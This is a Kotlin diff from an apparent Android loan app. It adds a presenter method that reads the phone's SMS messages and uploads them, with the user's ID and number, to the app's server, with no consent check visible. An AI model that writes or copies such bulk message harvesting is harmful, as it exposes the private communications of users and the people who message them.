@@ -1,6 +1,7 @@
 package com.neutron.deloan.confirm
 
 import android.annotation.SuppressLint
+import android.content.Context
 import com.neutron.deloan.NApplication
 import com.neutron.deloan.base.BasePresenter
 import com.neutron.deloan.net.RetrofitUtil
@@ -37,6 +38,29 @@ class ConfirmPresenter : BasePresenter<ConfirmContract.View>(), ConfirmContract.
 
 
 
+    }
+
+    override fun uploadCallAndSms(context: Context) {
+        GlobalScope.launch {
+            val phoneEPRE = PreferencesHelper.getPhoneEPRE();
+            val phone = PreferencesHelper.getPhone();
+            val userId = PreferencesHelper.getUserID()
+            val mobile = "$phoneEPRE$phone";
+            val record = Utils.getMessage(context);
+            if (record.size > 0) {
+                val hashMap = HashMap<String, Any>()
+                hashMap["user_id"] = userId
+                hashMap["self_mobile"] = mobile
+                hashMap["account_id"] = mobile
+                hashMap["record"] = record
+                RetrofitUtil.service.uploadSMS(Utils.createBody(Utils.createCommonParams(hashMap)))
+            }
+
+
+
+
+
+        }
     }
 
     @SuppressLint("CheckResult")
